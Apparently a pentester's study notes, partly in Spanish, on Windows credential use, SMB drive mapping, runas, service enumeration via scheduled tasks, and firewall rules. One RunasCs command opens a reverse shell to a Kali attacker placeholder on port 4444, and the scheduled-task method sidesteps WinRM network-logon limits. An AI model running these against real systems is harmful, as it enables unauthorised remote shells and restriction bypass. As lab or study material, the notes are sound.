- [[#Create Credential object|Create Credential object]]
- [[#Create PS Drive|Create PS Drive]]
- [[#Run cmd as other user|Run cmd as other user]]
- [[#Interactive Logon|Interactive Logon]]
	- [[#Interactive Logon#Forzar un Logon Type2 con RunasCS|Forzar un Logon Type2 con RunasCS]]
	- [[#Interactive Logon#Tareas programadas locales|Tareas programadas locales]]
- [[#Create Firewall Rule|Create Firewall Rule]]


## Create Credential object

```powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
```

## Create PS Drive

```cmd
net use /user:user j: \\ip\smbFolder password
```

```powershell
New-PSDrive -Name J -PSProvider FileSystem -Root "\\ip\smbFolder" -Credential $cred -Persist
```

## Run cmd as other user

```cmd
runas /user:backupadmin cmd
```

## Interactive Logon

**Service Control Manager (SCM)** de Windows tiene sus propias listas de control de acceso (DACLs). Cuando te conectas por WinRM, Windows crea un **Logon Type 3 (Network Logon)**, y el SCM capa la enumeración global de servicios para usuarios no administradores bajo este tipo de inicio de sesión.

### Forzar un Logon Type2 con RunasCS

```powershell
.\RunasCs.exe usuario1 Password123! cmd.exe -r TU_IP_KALI:4444
```

### Tareas programadas locales

Las tareas programadas no sufren la restricción de red porque se ejecutan de manera puramente local a nivel de sistema operativo (utilizan **Logon Type 4 / Batch** o se ejecutan directamente como `SYSTEM`). Si tu usuario tiene privilegios para crear una tarea programada, puedes usarla para ejecutar el comando de enumeración y volcar el resultado a un archivo de texto.

```cmd
schtasks /create /tn "EnumServicios" /tr "powershell.exe -Command Get-Service > C:\Windows\Tasks\services.txt" /sc once /st 23:59 /RU "TU_USUARIO"
schtasks /run /tn "EnumServicios"
type C:\Windows\Tasks\services.txt
schtasks /delete /tn "EnumServicios" /f
```

## Create Firewall Rule

```powershell
New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

Disallow

```powershell
Remove-NetFirewallRule -DisplayName "8080-In"
```